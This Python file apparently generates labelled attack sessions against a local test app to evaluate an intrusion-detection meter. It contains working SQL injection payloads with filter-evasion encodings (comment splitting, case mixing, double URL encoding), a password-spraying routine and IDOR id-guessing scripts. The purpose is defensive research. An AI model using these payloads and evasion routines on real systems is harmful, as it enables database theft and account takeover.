"""
Attack round 2 — the held-out evaluation set (spec §7.2, §13 Phase 7).

The methodological rule this exists to honour: attack data is generated TWICE,
in two rounds that are never mixed. Round 1 (tools/attack_traffic.py) trained
the meter with "straightforward, documented" attacks. Round 2 is generated
"deliberately varied — different tools, different encodings, different pacing"
and is used for REPORTED RESULTS ONLY, against a model that was frozen before
this traffic existed.

If round 2 simply repeated round 1, the evaluation would measure memorisation,
not generalisation, and any reviewer would see it immediately. So every attack
here differs from its round-1 counterpart in a way a real evolving adversary
would differ:

  * SQLi  — the SAME injections, but OBFUSCATED: inline comments splitting
            keywords (`uni/**/on sel/**/ect`), case mixing (`UnIoN`), URL and
            double-URL encoding, hex/char encoding, whitespace tricks. Textbook
            payloads were round 1; these are the evasions held back for round 2.
  * IDOR  — non-sequential id access: random probing and wide strides, over both
            the JSON API and the HTML pages. Object-id access is not passively
            detectable at all (a benign integration does the same), so these are
            caught, if at all, by bait rather than by any passive feature.
  * auth  — password spraying (one password across many users) rather than
            stuffing (many passwords at one user), and slow pacing that keeps
            the per-minute rate low.

The round label is `eval`, which the schema and the round-hygiene checks treat
as strictly separate from `train` (a training run refuses to fit on it).

    python -m tools.attack_traffic_round2 --sessions 48 --base-url http://127.0.0.1:8000
"""

from __future__ import annotations

import argparse
import random
import re
import time
import uuid
from urllib.parse import quote

import httpx

from adf.config import system
from adf.logstore import LabelSidecar
from adf.schema import PROVENANCE_HEADER
from target_app.otp import otp_for

GENERATOR = "attack_traffic_round2.py"
VERSION = "2.0"

# Round-2 tool user agents — deliberately different strings from round 1, as a
# real adversary would rotate tooling (spec §7.2 "different tools").
TOOL_AGENTS = [
    "sqlmap/1.9-dev",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/128.0",   # a manual attacker in a browser
    "python-httpx/0.28",
    "Go-http-client/2.0",
]

USERNAMES = ["a.mirza", "d.okafor", "s.lindqvist", "r.banerjee", "m.oconnell",
             "t.yamamoto", "k.novak", "j.mensah", "l.ferreira", "h.abbas"]

# Passwords for spraying — a few common ones tried across MANY users (the
# inverse of round-1 stuffing, which tried many passwords at ONE user).
SPRAY_PASSWORDS = ["Autumn2025!", "Welcome1", "Password123", "Changeme!"]


# --------------------------------------------------------------------------
# Obfuscation: same injections as round 1, encoded so the literal strings differ
# --------------------------------------------------------------------------

def _comment_split(payload: str) -> str:
    """Break SQL keywords with inline comments: UNION -> uni/**/on."""
    for kw in ("UNION", "SELECT", "FROM", "WHERE", "OR", "AND"):
        if kw in payload.upper():
            i = payload.upper().find(kw)
            mid = len(kw) // 2
            payload = payload[:i + mid] + "/**/" + payload[i + mid:]
    return payload


def _case_mix(payload: str, rng: random.Random) -> str:
    return "".join(c.upper() if rng.random() < 0.5 else c.lower() for c in payload)


def _url_encode(payload: str) -> str:
    return quote(payload, safe="")


def _double_url_encode(payload: str) -> str:
    return quote(quote(payload, safe=""), safe="")


def _whitespace_trick(payload: str) -> str:
    # replace spaces with SQL-equivalent comment whitespace
    return payload.replace(" ", "/**/")


_BASE_INJECTIONS = [
    "x' UNION SELECT 1,2,3,4 -- ",
    "x' UNION SELECT id, username, password_hash, role FROM users -- ",
    "x' OR '1'='1",
    "x' OR 1=1 -- ",
    "') OR ('1'='1",
]

_OBFUSCATORS = [_comment_split, _case_mix, _url_encode, _double_url_encode, _whitespace_trick]


def obfuscate(payload: str, rng: random.Random) -> str:
    fn = rng.choice(_OBFUSCATORS)
    return fn(payload, rng) if fn in (_case_mix,) else fn(payload)


# --------------------------------------------------------------------------
# Attackers
# --------------------------------------------------------------------------

# Set by --curiosity to pin the whole adversary population at one response-reading
# probability instead of drawing a mixed one. This exists so the headline can be
# reported as a CURVE over adversary curiosity (0.0 = the blind model, 1.0 = every
# attacker reads what it gets back) rather than at a single convenient point.
CURIOSITY_OVERRIDE: float | None = None

# The default mixed population for attackers that work through /search: some
# bait-aware, some curious. Neither a strawman that always bites nor one that never does.
_SQL_CURIOSITY = (0.0, 0.5, 0.5, 1.0)


class _Base:
    def __init__(self, base_url: str, rng: random.Random, *, dwell: bool) -> None:
        self.rng = rng
        self.dwell = dwell
        self.session_id = f"r2-{uuid.uuid4().hex[:10]}"
        self.ua = rng.choice(TOOL_AGENTS)
        self.client = httpx.Client(base_url=base_url, follow_redirects=True, timeout=10.0,
                                   headers={"User-Agent": self.ua, PROVENANCE_HEADER: self.session_id})

    def _draw_curiosity(self, choices) -> float:
        """Per-session probability of acting on something seen in a response."""
        if CURIOSITY_OVERRIDE is not None:
            return CURIOSITY_OVERRIDE
        return self.rng.choice(choices)

    def _follow_sql_bait(self, text: str) -> bool:
        """Query a table name leaked in an error, the way error-based SQLi works.

        Extracting a table name from a database error and then selecting from it
        is not an optional flourish, it is the attack. A profile that injects and
        never reads the error is doing something no real SQLi workflow does, and
        it makes every response-side probe unreachable by construction.
        """
        if self.bit:
            return False
        m = _STEALTH_TOKEN.search(text)
        if m and self.rng.random() < self.curiosity:
            self.client.get("/search", params={"q": m.group(0)})   # query the fake table
            self.bit = True
            return True
        return False

    def _pause(self, lo: float, hi: float) -> None:
        if self.dwell:
            time.sleep(self.rng.uniform(lo, hi))

    def _auth(self) -> None:
        self.client.post("/login", data={"username": "a.mirza", "password": "Summer2024!"})
        self.client.post("/otp", data={"code": otp_for(1)})

    def close(self) -> None:
        self.client.close()


class ObfuscatedSQLi(_Base):
    """Automated obfuscated injection that READS what comes back.

    Previously this profile fired payloads and never looked at the response, so
    its bite rate was 0.000 by construction while 90% of its sessions were being
    baited -- the probe was unreachable, not ineffective. Every real tool in this
    class (sqlmap, ghauri, Burp Intruder) parses each response; that parse is how
    it tells a working payload from a failing one. Curiosity stays MIXED so the
    population still contains bait-aware attackers.
    """
    subcategory = "sqli_obfuscated"
    category = "sqli"
    automation = "scripted"

    def __init__(self, base_url, rng, *, dwell):
        super().__init__(base_url, rng, dwell=dwell)
        self.curiosity = self._draw_curiosity(_SQL_CURIOSITY)
        self.bit = False

    def run(self) -> None:
        self._auth()
        for base in self.rng.sample(_BASE_INJECTIONS, k=self.rng.randint(3, 5)):
            # No early exit on a bite. Following a leaked table name is an EXTRA
            # action for this profile, not the end of it: an automated injector
            # working through a payload list does not abandon the list because one
            # response looked interesting. Breaking here truncated the session and
            # removed the passive evidence (keywords, error responses) the meter was
            # already catching it on, so recall fell even as the bite rate rose --
            # which would have measured session length, not the probe.
            r = self.client.get("/search", params={"q": obfuscate(base, self.rng)})
            self._follow_sql_bait(r.text)
            self._pause(0.05, 0.2)


class ScatteredIDOR(_Base):
    subcategory = "idor_scattered"
    category = "idor"
    automation = "scripted"

    def run(self) -> None:
        self._auth()
        # random / wide-stride ids over the API (object-id access leaves no
        stride = self.rng.choice([3, 5, 7, 11])
        start = self.rng.randint(1, 20)
        for k in range(self.rng.randint(6, 12)):
            pid = start + k * stride
            self.client.get(f"/api/profile/{pid}")
            self.client.get(f"/api/records/{pid}")
            self._pause(0.05, 0.15)


class PasswordSpray(_Base):
    subcategory = "auth_spray"
    category = "auth"
    automation = "scripted"

    def run(self) -> None:
        # one password across many users, slowly (low per-minute rate)
        password = self.rng.choice(SPRAY_PASSWORDS)
        for user in self.rng.sample(USERNAMES, k=self.rng.randint(6, 10)):
            self.client.post("/login", data={"username": user, "password": password})
            self._pause(0.1, 0.4)
        # then land the one real credential to reach the authed surface
        self.client.post("/login", data={"username": "a.mirza", "password": "Summer2024!"})
        self.client.post("/otp", data={"code": otp_for(1)})


class ManualObfuscated(_Base):
    """A human attacker (browser UA, irregular pacing) using encoded payloads —
    the attack/human cell, but for round 2."""
    subcategory = "sqli_obfuscated"
    category = "sqli"
    automation = "human"

    def __init__(self, base_url, rng, *, dwell):
        super().__init__(base_url, rng, dwell=dwell)
        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/127.0"
        self.client.headers["User-Agent"] = self.ua
        self.curiosity = self._draw_curiosity(_SQL_CURIOSITY)
        self.bit = False

    def run(self) -> None:
        self._auth()
        for base in self.rng.sample(_BASE_INJECTIONS, k=2):
            # As above: the bite is an extra action, not a reason to stop probing.
            r = self.client.get("/search", params={"q": obfuscate(base, self.rng)})
            self._follow_sql_bait(r.text)
            self._pause(1.0, 4.0)   # human think-time


_STEALTH_TOKEN = re.compile(r"acct_shadow_[a-f0-9]+")
_INTERNAL_VIEW = re.compile(r"internal_view")


class ScatteredHtmlIDOR(_Base):
    """IDOR through the UI pages (not the API), by GUESSING ids, non-sequentially.

    This is the case passive detection is blind to and the whole project exists
    for: accessing other users' /profile/{id} and /records/{id} by trying ids.
    It leaves almost no passive signal — no SQL keywords, no errors, no failed
    auth, no /api touch, and (being scattered) no ascending-id run — so the meter
    sits it in the uncertain band and a passive classifier (B2) never diverts it.
    A bait planted in those pages (B-IDOR-2's `internal_view` hint) is the only
    thing that can separate it from an ordinary user browsing the directory —
    IF the attacker acts on it. `curiosity` is mixed, as before.
    """
    subcategory = "idor_html_scattered"
    category = "idor"
    automation = "human"

    def __init__(self, base_url, rng, *, dwell):
        super().__init__(base_url, rng, dwell=dwell)
        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0"
        self.client.headers["User-Agent"] = self.ua
        self.curiosity = self._draw_curiosity([0.0, 0.5, 1.0, 1.0])  # mixed, leaning curious
        self.bit = False

    def _maybe_bite(self, text: str) -> None:
        if not self.bit and _INTERNAL_VIEW.search(text) and self.rng.random() < self.curiosity:
            # the hint says: append ?internal_view=1 to expand the full record
            self.client.get("/records/4", params={"internal_view": "1"})
            self.bit = True

    def run(self) -> None:
        self._auth()
        seen = set()
        for _ in range(self.rng.randint(6, 10)):
            if self.bit:
                break
            pid = self.rng.randint(1, 24)
            while pid in seen:
                pid = self.rng.randint(1, 24)
            seen.add(pid)
            surface = self.rng.choice(["/profile", "/records"])
            r = self.client.get(f"{surface}/{pid}")     # HTML page, scattered id
            self._maybe_bite(r.text)
            self._pause(0.5, 2.0)


class StealthProber(_Base):
    """A careful, low-and-slow manual attacker (spec §7.2 "different pacing").

    Round 1 and the other round-2 attackers are AGGRESSIVE -- they escalate to
    UNION dumps or spray many logins, so the passive features catch them fast
    and bait never gets a turn. A real adversary population also contains the
    patient prober who sends a few gentle, quote-only probes, reads the error,
    and follows what it finds. This is the CANONICAL manual-SQLi workflow, and
    it is exactly the uncertain-belief regime the value-of-information policy is
    designed for -- so omitting it would only ever measure bait where it cannot
    help.

    `curiosity` is the probability it acts on a table name it sees leaked in an
    error (the bite). It is drawn per session so the population is MIXED: some
    curious, some bait-aware -- neither a strawman that always bites nor one
    that never does. A curious prober is caught by B4 (bite -> divert) where the
    passive baseline B2 is still uncertain; a bait-aware one is not, which is the
    honest limit already reported by the robustness sweep.
    """
    subcategory = "sqli_stealth"
    category = "sqli"
    automation = "human"

    def __init__(self, base_url, rng, *, dwell):
        super().__init__(base_url, rng, dwell=dwell)
        self.ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
        self.client.headers["User-Agent"] = self.ua
        self.curiosity = self._draw_curiosity(_SQL_CURIOSITY)   # mixed population
        self.bit = False

    def _maybe_bite(self, text: str) -> None:
        self._follow_sql_bait(text)

    def run(self) -> None:
        self._auth()
        # gentle, quote-only probes: enough to look suspicious (bait band) but
        # not the aggressive injection that trips passive detection outright.
        for q in ("a'", "policy'", "report'", "user'", "notes'"):
            if self.bit:
                break
            r = self.client.get("/search", params={"q": q})
            self._maybe_bite(r.text)
            self._pause(0.8, 2.5)   # low-and-slow


PROFILES = {
    "sqli_obfuscated": (ObfuscatedSQLi, {}),
    "idor_scattered": (ScatteredIDOR, {}),
    "auth_spray": (PasswordSpray, {}),
    "sqli_manual_obf": (ManualObfuscated, {}),
    "sqli_stealth": (StealthProber, {}),
    "idor_html_scattered": (ScatteredHtmlIDOR, {}),
}


def main() -> None:
    cfg = system()
    ap = argparse.ArgumentParser(description="Attack round 2 — held-out eval set (spec §7.2).")
    ap.add_argument("--base-url", default=f"http://127.0.0.1:{cfg.get('network.proxy_port', 8000)}")
    ap.add_argument("--sessions", type=int, default=48, help="total attack sessions")
    ap.add_argument("--seed", type=int, default=cfg.seed + 1, help="distinct from round 1")
    ap.add_argument("--label-path", default=str(cfg.label_dir / "attack_round2_labels.jsonl"))
    ap.add_argument("--no-dwell", action="store_true")
    ap.add_argument("--curiosity", type=float, default=None,
                    help="pin every attacker's probability of acting on what it reads in a "
                         "response, instead of drawing a mixed one. 0.0 reproduces the old "
                         "blind-attacker model; omit for the mixed population.")
    args = ap.parse_args()

    if args.curiosity is not None:
        if not 0.0 <= args.curiosity <= 1.0:
            ap.error("--curiosity must be between 0.0 and 1.0")
        global CURIOSITY_OVERRIDE
        CURIOSITY_OVERRIDE = args.curiosity
        print(f"adversary curiosity pinned at {args.curiosity:.2f} (population not mixed)")

    rng = random.Random(args.seed)
    sidecar = LabelSidecar(args.label_path)
    names = list(PROFILES)
    print(f"attack round 2 -> {args.base_url}  ({args.sessions} sessions, seed {args.seed})")

    for i in range(args.sessions):
        name = names[i % len(names)]
        cls, kw = PROFILES[name]
        atk = cls(args.base_url, random.Random(rng.random()), dwell=not args.no_dwell, **kw)
        # label BEFORE acting (spec §7.3), round = eval
        sidecar.write(session_id=atk.session_id, ground_truth="attack",
                      attack_category=atk.category, attack_subcategory=atk.subcategory,
                      automation_label=atk.automation, generator=GENERATOR, tool_version=VERSION,
                      round="eval", notes=f"round2 {name}")
        atk.run()
        atk.close()
        if (i + 1) % 12 == 0:
            print(f"  ... {i + 1}/{args.sessions}")
    print(f"done: {args.sessions} round-2 attack sessions ({', '.join(names)})")


if __name__ == "__main__":
    main()
